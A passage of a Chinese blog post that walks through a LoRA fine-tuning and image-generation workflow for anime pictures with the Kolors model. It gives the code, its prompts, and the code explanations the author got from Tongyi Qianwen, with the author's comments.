class="string">&quot;二次元，一个紫色长发小女孩穿着粉色吊带漏肩连衣裙，在练习室练习唱歌，手持话筒&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;6.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">7</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，紫色长发少女，穿着黑色连衣裙，试衣间，心情忐忑&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;7.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，紫色长发少女，穿着黑色礼服，连衣裙，在台上唱歌&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;8.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">images = [np.array(Image.<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>)]</span><br><span class="line">image = np.concatenate([</span><br><span class="line">    np.concatenate(images[<span class="number">0</span>:<span class="number">2</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">2</span>:<span class="number">4</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">4</span>:<span class="number">6</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">6</span>:<span class="number">8</span>], axis=<span class="number">1</span>),</span><br><span class="line">], axis=<span class="number">0</span>)</span><br><span class="line">image = Image.fromarray(image).resize((<span class="number">1024</span>, <span class="number">2048</span>))</span><br><span class="line">image</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="使用通义千问分析代码的主体架构"><a class="header-anchor" href="#使用通义千问分析代码的主体架构">¶</a>使用通义千问分析代码的主体架构</h4>
<h5 id="输入的Prompt"><a class="header-anchor" href="#输入的Prompt">¶</a>输入的Prompt</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你是一个优秀的python开发工程师，现在我们需要你帮我们分析这个代码的主体框架，你需要把代码按照工作流分成几部分，用中文回答我的问题。&#123;此处替换前面的代码&#125;</span><br></pre></td></tr></table></figure>
<h5 id="返回结果"><a class="header-anchor" href="#返回结果">¶</a>返回结果</h5>
<h6 id="安装和卸载依赖包"><a class="header-anchor" href="#安装和卸载依赖包">¶</a>安装和卸载依赖包</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># simple-aesthetics-predictor, data-juicer, peft, lightning, pandas, torchvision, 和 DiffSynth-Studio 的安装</span></span><br><span class="line">!pip install simple-aesthetics-predictor</span><br><span class="line"></span><br><span class="line">!pip install -v -e data-juicer</span><br><span class="line"></span><br><span class="line">!pip install peft lightning pandas torchvision</span><br><span class="line"></span><br><span class="line">!pip install -e DiffSynth-Studio</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 pytorch-lightning（使用 -y 自动确认卸载）</span></span><br><span class="line">!pip uninstall pytorch-lightning -y</span><br></pre></td></tr></table></figure>
<h6 id="加载数据集"><a class="header-anchor" href="#加载数据集">¶</a>加载数据集</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用 ModelScope 的 MsDataset 类加载名为 AI-ModelScope/lowres_anime 的数据集，并指定子集名称为 default 和分割为 train，缓存目录设置为 /mnt/workspace/kolors/data</span><br><span class="line">ds = MsDataset.load(</span><br><span class="line">    <span class="string">&#x27;AI-ModelScope/lowres_anime&#x27;</span>,</span><br><span class="line">    subset_name=<span class="string">&#x27;default&#x27;</span>,</span><br><span class="line">    split=<span class="string">&#x27;train&#x27;</span>,</span><br><span class="line">    cache_dir=<span class="string">&quot;/mnt/workspace/kolors/data&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h6 id="数据预处理"><a class="header-anchor" href="#数据预处理">¶</a>数据预处理</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.makedirs(<span class="string">&quot;./data/lora_dataset/train&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">os.makedirs(<span class="string">&quot;./data/data-juicer/input&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据集中的图像转换为 RGB 模式，并保存到指定目录</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/input/metadata.jsonl&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> data_id, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(tqdm(ds)):</span><br><span class="line">        image = data[<span class="string">&quot;image&quot;</span>].convert(<span class="string">&quot;RGB&quot;</span>)</span><br><span class="line">        image.save(<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>)</span><br><span class="line">        metadata = &#123;<span class="string">&quot;text&quot;</span>: <span class="string">&quot;二次元&quot;</span>, <span class="string">&quot;image&quot;</span>: [<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>]&#125;</span><br><span class="line">        f.write(json.dumps(metadata))</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 创建包含图像路径和文本描述的元数据文件 metadata.jsonl</span></span><br><span class="line">data_juicer_config = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># global parameters</span></span><br><span class="line"><span class="string">project_name: &#x27;data-process&#x27;</span></span><br><span class="line"><span class="string">dataset_path: &#x27;./data/data-juicer/input/metadata.jsonl&#x27;  # path to your dataset directory or file</span></span><br><span class="line"><span class="string">np: 4  # number of subprocess to process your dataset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">text_keys: &#x27;text&#x27;</span></span><br><span class="line"><span class="string">image_key: &#x27;image&#x27;</span></span><br><span class="line"><span class="string">image_special_token: &#x27;&lt;__dj__image&gt;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export_path: &#x27;./data/data-juicer/output/result.jsonl&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># process schedule</span></span><br><span class="line"><span class="string"># a list of several process operators with their arguments</span></span><br><span class="line"><span class="string">process:</span></span><br><span class="line"><span class="string">    - image_shape_filter:</span></span><br><span class="line"><span class="string">        min_width: 1024</span></span><br><span class="line"><span class="string">        min_height: 1024</span></span><br><span class="line"><span class="string">        any_or_all: any</span></span><br><span class="line"><span class="string">    - image_aspect_ratio_filter:</span></span><br><span class="line"><span class="string">        min_ratio: 0.5</span></span><br><span class="line"><span class="string">        max_ratio: 2.0</span></span><br><span class="line"><span class="string">        any_or_all: any</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编写并保存 data_juicer_config.yaml 配置文件，用于后续的数据过滤和处理</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data/data-juicer/data_juicer_config.yaml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data_juicer_config.strip())</span><br></pre></td></tr></table></figure>
<h6 id="使用Data-Juicer进行数据处理"><a class="header-anchor" href="#使用Data-Juicer进行数据处理">¶</a>使用Data-Juicer进行数据处理</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 dj-process 命令根据配置文件对数据进行过滤和处理，生成 result.jsonl 文件</span></span><br><span class="line">!dj-process --config data/data-juicer/data_juicer_config.yaml</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="数据整理与训练"><a class="header-anchor" href="#数据整理与训练">¶</a>数据整理与训练</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">texts, file_names = [], []</span><br><span class="line">os.makedirs(<span class="string">&quot;./data/data-juicer/output/images&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 result.jsonl 文件中的数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/output/result.jsonl&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> tqdm(f):</span><br><span class="line">        metadata = json.loads(line)</span><br><span class="line">        texts.append(metadata[<span class="string">&quot;text&quot;</span>])</span><br><span class="line">        file_names.append(metadata[<span class="string">&quot;image&quot;</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将其转换为 Pandas DataFrame，然后保存为 CSV 文件</span></span><br><span class="line"><span class="comment"># 并且将图片保存到./data/lora_dataset_processed/train文件夹下（这行没找着？）</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&quot;text&quot;</span>: texts, <span class="string">&quot;file_name&quot;</span>: file_names&#125;)</span><br><span class="line">df.to_csv(<span class="string">&quot;./data/data-juicer/output/result.csv&quot;</span>, index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">df</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> CLIPProcessor, CLIPModel</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"></span><br><span class="line">model = CLIPModel.from_pretrained(<span class="string">&quot;openai/clip-vit-base-patch32&quot;</span>)</span><br><span class="line">processor = CLIPProcessor.from_pretrained(<span class="string">&quot;openai/clip-vit-base-patch32&quot;</span>)</span><br><span class="line"></span><br><span class="line">images = [Image.<span class="built_in">open</span>(img_path) <span class="keyword">for</span> img_path <span class="keyword">in</span> df[<span class="string">&quot;file_name&quot;</span>]]</span><br><span class="line">inputs = processor(text=df[<span class="string">&quot;text&quot;</span>].tolist(), images=images, return_tensors=<span class="string">&quot;pt&quot;</span>, padding=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">outputs = model(**inputs)</span><br><span class="line">logits_per_image = outputs.logits_per_image  <span class="comment"># this is the image-text similarity score</span></span><br><span class="line">probs = logits_per_image.softmax(dim=<span class="number">1</span>)  <span class="comment"># we can take the softmax to get the probabilities</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载模型download_models([&quot;Kolors&quot;, &quot;SDXL-vae-fp16-fix&quot;])</span></span><br><span class="line"><span class="comment"># 在前面模型的基础上，执行Lora微调训练</span></span><br><span class="line"><span class="comment"># 加载微调后的模型</span></span><br><span class="line">↑↑↑↑没找到？？？T T</span><br></pre></td></tr></table></figure>
<h6 id="图像生成"><a class="header-anchor" href="#图像生成">¶</a>图像生成</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置正向提示词，反向提示词，执行次数，图片尺寸</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，日系动漫，演唱会的观众席，人山人海，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，舞台上衣着华丽的歌星们在唱歌&quot;</span>,  <span class="comment"># 正向提示词</span></span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,  <span class="comment"># 反向提示词</span></span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,  <span class="comment"># 执行次数和图片尺寸</span></span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;1.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)  <span class="comment"># 随机种子，控制图片是否可以重复生成</span></span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，露出憧憬的神情&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，色情擦边&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;2.jpg&quot;</span>)  <span class="comment"># 将图片保存为.jpg文件</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">2</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙坐在演唱会的观众席，露出憧憬的神情&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，色情擦边&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;3.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">5</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色短发小女孩穿着粉色吊带漏肩连衣裙，对着流星许愿，闭着眼睛，十指交叉，侧面&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度，扭曲的手指，多余的手指&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;4.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色中等长度头发小女孩穿着粉色吊带漏肩连衣裙，在练习室练习唱歌&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;5.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，一个紫色长发小女孩穿着粉色吊带漏肩连衣裙，在练习室练习唱歌，手持话筒&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;6.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">7</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，紫色长发少女，穿着黑色连衣裙，试衣间，心情忐忑&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;7.jpg&quot;</span>)</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">image = pipe(</span><br><span class="line">    prompt=<span class="string">&quot;二次元，紫色长发少女，穿着黑色礼服，连衣裙，在台上唱歌&quot;</span>,</span><br><span class="line">    negative_prompt=<span class="string">&quot;丑陋、变形、嘈杂、模糊、低对比度&quot;</span>,</span><br><span class="line">    cfg_scale=<span class="number">4</span>,</span><br><span class="line">    num_inference_steps=<span class="number">50</span>, height=<span class="number">1024</span>, width=<span class="number">1024</span>,</span><br><span class="line">)</span><br><span class="line">image.save(<span class="string">&quot;8.jpg&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="合并图像"><a class="header-anchor" href="#合并图像">¶</a>合并图像</h6>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将生成的多个图像合并成一个大图像</span></span><br><span class="line">images = [np.array(Image.<span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.jpg&quot;</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>)]</span><br><span class="line">image = np.concatenate([</span><br><span class="line">    np.concatenate(images[<span class="number">0</span>:<span class="number">2</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">2</span>:<span class="number">4</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">4</span>:<span class="number">6</span>], axis=<span class="number">1</span>),</span><br><span class="line">    np.concatenate(images[<span class="number">6</span>:<span class="number">8</span>], axis=<span class="number">1</span>),</span><br><span class="line">], axis=<span class="number">0</span>)</span><br><span class="line">image = Image.fromarray(image).resize((<span class="number">1024</span>, <span class="number">2048</span>))  <span class="comment"># 并调整大小</span></span><br></pre></td></tr></table></figure>
<h5 id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h5>
<ul>
<li>整个流程涵盖了：
<ul>
<li><strong>数据加载</strong> | <strong>预处理</strong> | <strong>特征提取</strong> | <strong>模型预测</strong> | <strong>图像生成</strong>等多个方面</li>
<li>每一部分都有其特定的功能，共同构成了一个完整的二次元图像处理和生成的工作流</li>
</ul>
</li>
</ul>
<h4 id="使用通义千问逐行解释代码"><a class="header-anchor" href="#使用通义千问逐行解释代码">¶</a>使用通义千问逐行解释代码</h4>
<h5 id="输入的问题"><a class="header-anchor" href="#输入的问题">¶</a>输入的问题</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你是一个优秀的python开发工程师，现在我们需要你帮我们逐行分析这个代码，用中文回答我的问题。&#123;此处替换前面的代码&#125;</span><br></pre></td></tr></table></figure>
<h5 id="返回的结果"><a class="header-anchor" href="#返回的结果">¶</a>返回的结果</h5>
<ul>
<li>
<p>（不是合着我前面没看到这里所以白猜了半天？？淦！）</p>
</li>
<li>
<p>已破防，已老实）</p>
</li>
<li>
<p>这段代码主要完成以下功能：</p>
</li>
</ul>
<ol>
<li>安装和卸载一些Python包。</li>
<li>从ModelScope加载一个名为<code>lowres_anime</code>的数据集，并保存图像到指定目录。</li>
<li>创建并处理一个用于数据清洗的JSONL文件。</li>
<li>使用<code>data-juicer</code>工具过滤和处理数据集。</li>
<li>将处理后的数据集转换为CSV格式。</li>
<li>根据数据集通过DiffSynth做Lora微调</li>
<li>加载Lora微调后的模型</li>
<li>设置提示词，用微调后的模型生成图片</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装 Data-Juicer 和 DiffSynth-Studio</span></span><br><span class="line">!pip install simple-aesthetics-predictor <span class="comment"># 安装simple-aesthetics-predictor</span></span><br><span class="line">!pip install -v -e data-juicer <span class="comment"># 安装data-juicer</span></span><br><span class="line">!pip uninstall pytorch-lightning -y <span class="comment"># 卸载pytorch-lightning</span></span><br><span class="line">!pip install peft lightning pandas torchvision <span class="comment"># 安装 peft lightning pandas torchvision</span></span><br><span class="line">!pip install -e DiffSynth-Studio <span class="comment"># 安装DiffSynth-Studio</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从魔搭数据集中下载数据集AI-ModelScope/lowres_anime</span></span><br><span class="line"><span class="keyword">from</span> modelscope.msdatasets <span class="keyword">import</span> MsDataset  <span class="comment">#引入数据集模块msdatasets</span></span><br><span class="line">ds = MsDataset.load(</span><br><span class="line">    <span class="string">&#x27;AI-ModelScope/lowres_anime&#x27;</span>,</span><br><span class="line">    subset_name=<span class="string">&#x27;default&#x27;</span>,</span><br><span class="line">    split=<span class="string">&#x27;train&#x27;</span>,</span><br><span class="line">    cache_dir=<span class="string">&quot;/mnt/workspace/kolors/data&quot;</span> <span class="comment"># 指定缓存目录</span></span><br><span class="line">) <span class="comment"># 从魔搭数据集中下载数据集AI-ModelScope/lowres_anime，赋值给参数ds</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成数据集</span></span><br><span class="line"><span class="keyword">import</span> json, os <span class="comment"># 导入json和os模块</span></span><br><span class="line"><span class="keyword">from</span> data_juicer.utils.mm_utils <span class="keyword">import</span> SpecialTokens <span class="comment"># 导入SpecialTokens</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># 导入tqdm进度条管理</span></span><br><span class="line">os.makedirs(<span class="string">&quot;./data/lora_dataset/train&quot;</span>, exist_ok=<span class="literal">True</span>) <span class="comment"># 创建文件夹./data/lora_dataset/train</span></span><br><span class="line">os.makedirs(<span class="string">&quot;./data/data-juicer/input&quot;</span>, exist_ok=<span class="literal">True</span>) <span class="comment"># 创建文件夹./data/data-juicer/input</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/input/metadata.jsonl&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> data_id, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(tqdm(ds)): <span class="comment"># 遍历数据集ds</span></span><br><span class="line">        image = data[<span class="string">&quot;image&quot;</span>].convert(<span class="string">&quot;RGB&quot;</span>) <span class="comment"># 将数据集的图片转换为RGB</span></span><br><span class="line">        image.save(<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>) <span class="comment"># 保存数据集的图片</span></span><br><span class="line">        metadata = &#123;<span class="string">&quot;text&quot;</span>: <span class="string">&quot;二次元&quot;</span>, <span class="string">&quot;image&quot;</span>: [<span class="string">f&quot;/mnt/workspace/kolors/data/lora_dataset/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>]&#125; <span class="comment"># 生成当前图片的索引数据</span></span><br><span class="line">        f.write(json.dumps(metadata)) <span class="comment"># 将索引数据写入文件./data/data-juicer/input/metadata.jsonl</span></span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置data-juicer，并进行数据筛选过滤</span></span><br><span class="line"><span class="comment"># 配置过滤的规则</span></span><br><span class="line">data_juicer_config = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># global parameters</span></span><br><span class="line"><span class="string">project_name: &#x27;data-process&#x27; # 名称</span></span><br><span class="line"><span class="string">dataset_path: &#x27;./data/data-juicer/input/metadata.jsonl&#x27;  # 你前面生成的数据的索引文件</span></span><br><span class="line"><span class="string">np: 4  # 线程数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">text_keys: &#x27;text&#x27; # 文件./data/data-juicer/input/metadata.jsonl的描述的字段名</span></span><br><span class="line"><span class="string">image_key: &#x27;image&#x27; # 文件./data/data-juicer/input/metadata.jsonl的图片字段名</span></span><br><span class="line"><span class="string">image_special_token: &#x27;&lt;__dj__image&gt;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">export_path: &#x27;./data/data-juicer/output/result.jsonl&#x27; # 筛选通过的图片结果保存的的索引文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># process schedule</span></span><br><span class="line"><span class="string"># a list of several process operators with their arguments</span></span><br><span class="line"><span class="string"># 过滤的规则</span></span><br><span class="line"><span class="string">process:</span></span><br><span class="line"><span class="string">    - image_shape_filter: # 图片尺寸过滤</span></span><br><span class="line"><span class="string">        min_width: 1024 # 最小宽度1024</span></span><br><span class="line"><span class="string">        min_height: 1024 # 最小高度1024</span></span><br><span class="line"><span class="string">        any_or_all: any # 符合前面条件的图片才会被保留</span></span><br><span class="line"><span class="string">    - image_aspect_ratio_filter: # 图片长宽比过滤</span></span><br><span class="line"><span class="string">        min_ratio: 0.5 # 最小长宽比0.5</span></span><br><span class="line"><span class="string">        max_ratio: 2.0 # 最大长宽比2.0</span></span><br><span class="line"><span class="string">        any_or_all: any # 符合前面条件的图片才会被保留</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存data-juicer配置到data/data-juicer/data_juicer_config.yaml</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data/data-juicer/data_juicer_config.yaml&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(data_juicer_config.strip())</span><br><span class="line"><span class="comment"># data-juicer开始执行数据筛选</span></span><br><span class="line">!dj-process --config data/data-juicer/data_juicer_config.yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过前面通过data-juicer筛选的图片索引信息./data/data-juicer/output/result.jsonl，生成数据集</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd <span class="comment"># 导入pandas</span></span><br><span class="line"><span class="keyword">import</span> os, json <span class="comment"># 导入os和json</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># 导入Image</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm <span class="comment"># 导入tqdm进度条管理</span></span><br><span class="line">texts, file_names = [], [] <span class="comment"># 定义两个空列表，分别存储图片描述和图片名称</span></span><br><span class="line">os.makedirs(<span class="string">&quot;./data/lora_dataset_processed/train&quot;</span>, exist_ok=<span class="literal">True</span>) <span class="comment"># 创建文件夹./data/lora_dataset_processed/train</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data/data-juicer/output/result.jsonl&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file: <span class="comment"># 打开前面data-juicer筛选的图片索引文件./data/data-juicer/output/result.jsonl</span></span><br><span class="line">    <span class="keyword">for</span> data_id, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(tqdm(file.readlines())): <span class="comment"># 遍历文件./data/data-juicer/output/result.jsonl</span></span><br><span class="line">        data = json.loads(data) <span class="comment"># 将json字符串转换为对象</span></span><br><span class="line">        text = data[<span class="string">&quot;text&quot;</span>] <span class="comment"># 获取对象中的text属性，也就是图片的描述信息</span></span><br><span class="line">        texts.append(text) <span class="comment"># 将图片的描述信息添加到texts列表中</span></span><br><span class="line">        image = Image.<span class="built_in">open</span>(data[<span class="string">&quot;image&quot;</span>][<span class="number">0</span>]) <span class="comment"># 获取对象中的image属性，也就是图片的路径,然后用这个路径打开图片</span></span><br><span class="line">        image_path = <span class="string">f&quot;./data/lora_dataset_processed/train/<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span> <span class="comment"># 生成保存图片的路径</span></span><br><span class="line">        image.save(image_path) <span class="comment"># 将图片保存到./data/lora_dataset_processed/train文件夹中</span></span><br><span class="line">        file_names.append(<span class="string">f&quot;<span class="subst">&#123;data_id&#125;</span>.jpg&quot;</span>) <span class="comment"># 将图片名称添加到file_names列表中</span></span><br><span class="line">data_frame = pd.DataFrame() <span class="comment"># 创建空的DataFrame</span></span><br><span class="line">data_frame[<span class="string">&quot;file_name&quot;</span>] = file_names <span class="comment"># 将图片名称添加到data_frame中</span></span><br><span class="line">data_frame[<span class="string">&quot;text&quot;</span>] = texts <span class="comment"># 将图片描述添加到data_frame中</span></span><br><span class="line">data_frame.to_csv(<span class="string">&quot;./data/lora_dataset_processed/train/metadata.csv&quot;</span>, index=<span class="literal">False</span>, encoding=<span class="string">&quot;utf-8-sig&quot;</span>) <span class="comment"># 将data_frame保存到./data/lora_dataset_processed/train/metadata.csv</span></span><br><span class="line">data_frame <span class="comment"># 查看data_frame</span></span><br><span class="line"></span><br><span class="line"></span><br><span 